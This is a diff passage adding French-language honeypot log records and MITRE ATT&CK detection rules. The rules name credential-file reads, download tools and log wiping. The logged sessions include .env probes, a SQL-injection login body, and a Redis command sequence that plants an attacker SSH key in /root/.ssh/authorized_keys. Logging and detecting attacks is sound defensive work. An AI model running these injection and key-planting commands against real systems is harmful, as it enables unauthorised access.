+        "pattern": "(cat\\s+/etc/(passwd|shadow)|grep\\s+.*shadow|unshadow|mimikatz|id_rsa|\\.aws/credentials|\\.docker/config)",
+        "severity": "CRITICAL",
+        "desc": "Tentative d'extraction de comptes, clés privées ou hashs de mots de passe système"
+      },
+      {
+        "id": "T1105",
+        "name": "Ingress Tool Transfer",
+        "tactic": "Command and Control",
+        "pattern": "\\b(wget\\b|curl\\b|tftp\\b|ftpget\\b|fetch\\b|scp\\b|bitsadmin|certutil)\\b",
+        "severity": "HIGH",
+        "desc": "Téléchargement d'un payload externe, binaire malveillant ou script de minage"
+      },
+      {
+        "id": "T1059",
+        "name": "Command and Scripting Interpreter",
+        "tactic": "Execution",
+        "pattern": "\\b(\\./[^\\s]+|bash\\b|sh\\b|python\\d*\\b|perl\\b|php\\b|powershell\\b)\\b",
+        "severity": "MEDIUM",
+        "desc": "Exécution d'un binaire suspect, script shell ou interpréteur de commandes"
+      },
+      {
+        "id": "T1222",
+        "name": "File Permissions Modification",
+        "tactic": "Defense Evasion",
+        "pattern": "\\b(chmod\\s+(\\+x|777|755)|chown\\b|attrib\\b)\\b",
+        "severity": "MEDIUM",
+        "desc": "Attribution des privilèges d'exécution sur un payload ou évasion de contrôles"
+      },
+      {
+        "id": "T1059",
+        "name": "Command and Scripting Interpreter",
+        "tactic": "Execution",
+        "pattern": "\\b(\\./[^\\s]+|bash\\b|sh\\b|python\\d*\\b|perl\\b|php\\b|powershell\\b)\\b",
+        "severity": "MEDIUM",
+        "desc": "Exécution d'un binaire suspect, script shell ou interpréteur de commandes"
+      },
+      {
+        "id": "T1053",
+        "name": "Scheduled Task / Job (Cron Persistence)",
+        "tactic": "Persistence",
+        "pattern": "\\b(crontab\\b|/etc/cron|systemctl\\s+enable|schtasks\\b)\\b",
+        "severity": "HIGH",
+        "desc": "Tentative de persistance via tâche planifiée cron ou enregistrement de service"
+      },
+      {
+        "id": "T1070",
+        "name": "Indicator Removal on Host",
+        "tactic": "Defense Evasion",
+        "pattern": "\\b(history\\s+-c|rm\\s+.*\\.log|unset\\s+HISTFILE|killall\\s+-9)\\b",
+        "severity": "HIGH",
+        "desc": "Effacement de l'historique bash ou suppression de journaux d'audit pour masquer l'intrusion"
+      }
+    ]
+  },
+  {
+    "session_id": "web-1794234173",
+    "type": "web_attack",
+    "timestamp": "2026-11-09T14:22:53.388562+00:00",
+    "source_ip": "45.154.255.89",
+    "geo": {
+      "country": "Pays-Bas (Botnet Scanner)",
+      "country_code": "NL",
+      "city": "Amsterdam",
+      "isp": "Bulletproof Host",
+      "threat_level": "Malveillant"
+    },
+    "method": "GET",
+    "path": "/.env",
+    "body": "",
+    "mitre_alerts": [
+      {
+        "id": "T1190",
+        "name": "Exploit Public-Facing Application",
+        "tactic": "Initial Access",
+        "pattern": "(SELECT\\s+.*FROM|UNION\\s+SELECT|'\\s*OR\\s*'1'='1|\\.\\./|\\.env|\\.git/config|wp-config|phpmyadmin|actuator|/api/v1/debug)",
+        "severity": "CRITICAL",
+        "desc": "Injection SQL, Directory Traversal, ou sonde de fichiers de configuration sensibles"
+      }
+    ]
+  },
+  {
+    "session_id": "web-1794234173",
+    "type": "web_attack",
+    "timestamp": "2026-11-09T14:22:53.612797+00:00",
+    "source_ip": "45.154.255.89",
+    "geo": {
+      "country": "Pays-Bas (Botnet Scanner)",
+      "country_code": "NL",
+      "city": "Amsterdam",
+      "isp": "Bulletproof Host",
+      "threat_level": "Malveillant"
+    },
+    "method": "GET",
+    "path": "/wp-login.php",
+    "body": "",
+    "mitre_alerts": [
+      {
+        "id": "T1059",
+        "name": "Command and Scripting Interpreter",
+        "tactic": "Execution",
+        "pattern": "\\b(\\./[^\\s]+|bash\\b|sh\\b|python\\d*\\b|perl\\b|php\\b|powershell\\b)\\b",
+        "severity": "MEDIUM",
+        "desc": "Exécution d'un binaire suspect, script shell ou interpréteur de commandes"
+      }
+    ]
+  },
+  {
+    "session_id": "web-1794234173",
+    "type": "web_attack",
+    "timestamp": "2026-11-09T14:22:53.845226+00:00",
+    "source_ip": "45.154.255.89",
+    "geo": {
+      "country": "Pays-Bas (Botnet Scanner)",
+      "country_code": "NL",
+      "city": "Amsterdam",
+      "isp": "Bulletproof Host",
+      "threat_level": "Malveillant"
+    },
+    "method": "POST",
+    "path": "/login",
+    "body": "username=admin' OR '1'='1&password=password",
+    "mitre_alerts": [
+      {
+        "id": "T1190",
+        "name": "Exploit Public-Facing Application",
+        "tactic": "Initial Access",
+        "pattern": "(SELECT\\s+.*FROM|UNION\\s+SELECT|'\\s*OR\\s*'1'='1|\\.\\./|\\.env|\\.git/config|wp-config|phpmyadmin|actuator|/api/v1/debug)",
+        "severity": "CRITICAL",
+        "desc": "Injection SQL, Directory Traversal, ou sonde de fichiers de configuration sensibles"
+      }
+    ]
+  },
+  {
+    "session_id": "redis-1794234174",
+    "type": "redis_exploit",
+    "timestamp": "2026-11-09T14:22:54.677400+00:00",
+    "source_ip": "194.26.29.112",
+    "geo": {
+      "country": "Russie",
+      "country_code": "RU",
+      "city": "Moscou",
+      "isp": "BadHost LLC",
+      "threat_level": "C2 Scanner"
+    },
+    "commands": [
+      {
+        "time": "15:22:54",
+        "command": "CONFIG SET dir /root/.ssh"
+      },
+      {
+        "time": "15:22:54",
+        "command": "CONFIG SET dbfilename authorized_keys"
+      },
+      {
+        "time": "15:22:54",
+        "command": "SET crackit \"\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... attacker@darknet\\n\\n\""
+      },
+      {
+        "time": "15:22:54",
+        "command": "SAVE"
+      }
+    ],
+    "mitre_alerts": [
+      {
+        "id": "T1098",
+        "name": "Account Manipulation (SSH Key Injection)",
+        "tactic": "Persistence",
+        "pattern": "(authorized_keys|ssh-rsa|useradd\\b|usermod\\b|CONFIG\\s+SET\\s+dir\\s+/root/\\.ssh|CONFIG\\s+SET\\s+dbfilename)",
+        "severity": "CRITICAL",
+        "desc": "Injection de clés publiques SSH ou modification de comptes pour accès permanent"
+      },
+      {
+        "id": "T1098",
+        "name": "Account Manipulation (SSH Key Injection)",
+        "tactic": "Persistence",
+        "pattern": "(authorized_keys|ssh-rsa|useradd\\b|usermod\\b|CONFIG\\s+SET\\s+dir\\s+/root/\\.ssh|CONFIG\\s+SET\\s+dbfilename)",
+        "severity": "CRITICAL",
+        "desc": "Injection de clés publiques SSH ou modification de comptes pour accès permanent"
+      },
+      {
+        "id": "T1098",
+        "name": "Account Manipulation (SSH Key Injection)",
+        "tactic": "Persistence",
+        "pattern": "(authorized_keys|ssh-rsa|useradd\\b|usermod\\b|CONFIG\\s+SET\\s+dir\\s+/root/\\.ssh|CONFIG\\s+SET\\s+dbfilename)",
+        "severity": "CRITICAL",
+        "desc": "Injection de clés publiques SSH ou modification de comptes pour accès permanent"
+      }
+    ]
+  },
+  {
+    "session_id": "mysql-1794234174",
+    "type": "mysql_auth_attempt",
+    "timestamp": "2026-11-09T14:22:54.705093+00:00",
+    "source_ip": "198.51.100.44",
+    "geo": {
+      "country": "États-Unis",
+      "country_code": "US",
+      "city": "Ashburn",
+      "isp": "Cloud Provider",
+      "threat_level": "Scanner"
+    },
+    "auth": {
+      "username": "root"
+    },
+    "mitre_alerts": [
+      {
+        "id": "T1110",
+        "name": "Brute Force (Database)",
+        "tactic": "Credential Access",
+        "severity": "HIGH",
+        "desc": "Tentative de force brute ou connexion non autorisée sur service de base de données MySQL"
+      }
+    ]
+  },
+  {
+    "session_id": "web-get-1794234182-56391",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:23:02.103115+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
   }
 ]
